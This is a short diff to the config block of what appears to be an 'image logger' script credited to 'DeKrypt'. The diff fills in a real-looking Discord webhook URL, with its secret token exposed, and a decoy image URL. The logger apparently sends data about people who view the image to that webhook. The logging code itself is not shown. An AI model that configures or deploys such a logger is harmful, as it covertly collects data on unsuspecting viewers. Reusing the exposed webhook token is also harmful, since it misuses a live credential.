@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here",  # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1492324647079903293/QbC0V-dzdYfok5NqV1-eG1DmNVCQGJYdD0zpLHPDkh9QD3yKJmRYJfHmy--PVCAj7qn5",
+    "image": "https://images.wondershare.com/repairit/aticle/2021/07/resolve-images-not-showing-problem-1.jpg",  # You can also have a custom image by using a URL argument
                                                    # (E.g. yoursite.com/imageLogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
 
